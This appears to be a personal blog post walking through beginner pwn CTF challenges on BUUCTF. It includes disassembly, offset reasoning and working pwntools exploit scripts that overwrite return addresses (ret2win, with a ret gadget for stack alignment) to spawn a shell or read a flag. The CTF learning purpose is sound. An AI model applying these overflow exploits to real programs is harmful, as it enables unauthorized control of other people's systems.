title: Learning to PWN
date: 2026-01-24 12:00:00
tags:
  - ctf
  - Linux
  - safety
categories:
  - 技术
  - 折腾日志
---

During several previous CTF competitions, I could do a bit of every category except **pwn**. So this winter holiday I decided to properly learn it. Turns out it’s *really* fun when you actually manage to pwn something.

This blog post will keep updating (hopefully).

<!-- more -->

## What “pwn” means

**Pwn** basically means **own**—it started as a typo because `p` is next to `o` on the keyboard. In CTF context, “pwn” usually means gaining **unauthorized control** of a program by exploiting vulnerabilities (often memory corruption).

If you want to learn pwn, some assembly + basic systems knowledge helps a lot. If you don’t have those yet, you can learn them along the way.

Anyway, let’s start the journey of learning **PWN** by solving challenges (the most fun way, in my opinion).

---

## Challenge: `test_your_nc`

**File:** https://files.buuoj.cn/files/643dec2806122d3fac330c9792d43b5d/test

To access remote services you typically use `netcat`. This challenge is very simple: after throwing it into IDA, it’s basically a program that spawns `/bin/sh`.

So you can just:

- `nc ip port`
- then `cat /flag`

---

## Challenge: `rip`

“RIP” = *rest in peace*… but in x86_64 it’s also the register that points to the next instruction.

**File:** https://files.buuoj.cn/files/96928d9cad0663625615b96e2970a30f/pwn1

### Recon

In IDA, the program flow is essentially:

- `puts`
- `gets`
- `puts` (echo)
- `puts`
- return

And there is an unused function `fun()` that calls `system("/bin/sh")`.

So the goal is straightforward: **overwrite the return address** so that execution returns into `fun()`.

### Disassembly (key part)

I dumped assembly with:

```/dev/null/bash#L1-2
objdump -d pwn1 | vim -
```

And the crucial part looks like:

```/dev/null/asm#L1-46
0000000000401142 <main>:
  401142: 55                    push   %rbp
  401143: 48 89 e5              mov    %rsp,%rbp
  401146: 48 83 ec 10           sub    $0x10,%rsp
  40114a: 48 8d 3d b3 0e 00 00  lea    0xeb3(%rip),%rdi
  401151: e8 da fe ff ff        call   401030 <puts@plt>
  401156: 48 8d 45 f1           lea    -0xf(%rbp),%rax
  40115a: 48 89 c7              mov    %rax,%rdi
  40115d: b8 00 00 00 00        mov    $0x0,%eax
  401162: e8 e9 fe ff ff        call   401050 <gets@plt>
  401167: 48 8d 45 f1           lea    -0xf(%rbp),%rax
  40116b: 48 89 c7              mov    %rax,%rdi
  40116e: e8 bd fe ff ff        call   401030 <puts@plt>
  401173: 48 8d 3d 97 0e 00 00  lea    0xe97(%rip),%rdi
  40117a: e8 b1 fe ff ff        call   401030 <puts@plt>
  40117f: b8 00 00 00 00        mov    $0x0,%eax
  401184: c9                    leave
  401185: c3                    ret

0000000000401186 <fun>:
  401186: 55                    push   %rbp
  401187: 48 89 e5              mov    %rsp,%rbp
  40118a: 48 8d 3d 8a 0e 00 00  lea    0xe8a(%rip),%rdi
  401191: e8 aa fe ff ff        call   401040 <system@plt>
  401196: 90                    nop
  401197: 5d                    pop    %rbp
  401198: c3                    ret
```

### Why overflow works (offset calculation)

The call to `gets()` is the vulnerability: it reads until newline without bounds checking.

Stack layout (as suggested by the disassembly):

- buffer starts at `rbp - 0xF` (i.e. 15 bytes below `rbp`)
- saved `rbp` is at `[rbp]`
- return address is at `[rbp + 0x8]`

To reach the return address:

- 15 bytes to fill up to saved `rbp`
- then 8 bytes to overwrite saved `rbp`

So the offset to the return address is:

- `15 + 8 = 23` bytes
- the 24th byte starts overwriting the return address

### First exploit attempt (local)

```/dev/null/python#L1-28
from pwn import *

elf = ELF("./pwn1")
p = process("./pwn1")

offset = 23
target_address = elf.symbols["fun"]

payload = b"A" * offset + p64(target_address)

p.recvuntil(b"input\n")
p.sendline(payload)
p.interactive()
```

This crashed with:

- `SIGSEGV (Segmentation Fault)`

### Fix: stack alignment (x86_64)

On x86_64 SysV ABI, the stack pointer (`RSP`) should be **16-byte aligned** at certain call boundaries. `system()` (and glibc internals) may use instructions like `movaps` that assume proper alignment. If you “return into” a function without the stack being aligned as expected, it can crash inside libc.

A common fix: add a `ret` gadget before the function address. That shifts `rsp` by 8 bytes and can restore alignment.

### Working exploit (local + remote)

```/dev/null/python#L1-40
from pwn import *
import time

elf = ELF("./pwn1")

# Local
p = process("./pwn1")

# Remote (uncomment if needed)
# p = remote("node5.buuoj.cn", 25564)

offset = 23
target_address = elf.symbols["fun"]   # e.g. 0x401186
ret_gadget = 0x401016                # address of a single 'ret' instruction

payload = b"A" * offset
payload += p64(ret_gadget)
payload += p64(target_address)

# Sometimes remote buffering makes strict recvuntil flaky
# p.recvuntil(b"input\n")
time.sleep(1)

p.sendline(payload)
p.interactive()
```

---

## Challenge: `warmup_csaw_2016`

**File:** https://files.buuoj.cn/files/dcd3c0cc561089a3969fba10d626ccf6/warmup_csaw_2016

### Decompile main

In IDA, `main()` looks like:

```/dev/null/cpp#L1-17
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s[64]; // [rsp+0h] [rbp-80h] BYREF
  _BYTE v5[64]; // [rsp+40h] [rbp-40h] BYREF

  write(1, "-Warm Up-\n", 0xAu);
  write(1, "WOW:", 4u);
  sprintf(s, "%p\n", sub_40060D);
  write(1, s, 9u);
  write(1, ">", 1u);
  return gets(v5);
}
```

And the target function is:

```/dev/null/cpp#L1-4
int sub_40060D()
{
  return system("cat flag.txt");
}
```

Key point: the program **prints the address** of `sub_40060D`. That’s extremely helpful because with ASLR/PIE you often can’t hardcode function addresses.

### Assembly near `gets`

```/dev/null/asm#L1-8
400692: 48 8d 45 c0           lea    -0x40(%rbp),%rax
400696: 48 89 c7              mov    %rax,%rdi
400699: b8 00 00 00 00        mov    $0x0,%eax
40069e: e8 5d fe ff ff        call   400500 <gets@plt>
4006a3: c9                    leave
4006a4: c3                    ret
```

So the overflow distance is:

- 64 bytes buffer
- 8 bytes saved `rbp`
- => offset = `72`

Then place:

- optional `ret` gadget for alignment
- then the leaked function address

### Exploit script

```/dev/null/python#L1-37
from pwn import *

elf = ELF("./warmup_csaw_2016")

# Local
p = process("./warmup_csaw_2016")

# Remote (uncomment if needed)
# p = remote("node5.buuoj.cn", 26871)

offset = 72

p.recvuntil(b"WOW:")
address_string = p.recvline().strip()     # e.g. b'0x40060d'
target_address = int(address_string, 16)

ret_gadget = 0x4004A1

payload = b"A" * offset + p64(ret_gadget) + p64(target_address)

p.recvuntil(b">")
p.sendline(payload)

print(p.recvall().decode(errors="replace"))
```

Why also include `ret_gadget` here?

- You’re not reaching `system()` via a normal `call` chain.
- Returning directly into the target can lead to an 8-byte stack misalignment.
- The extra `ret` often fixes it by restoring the expected 16-byte alignment before libc code runs.

---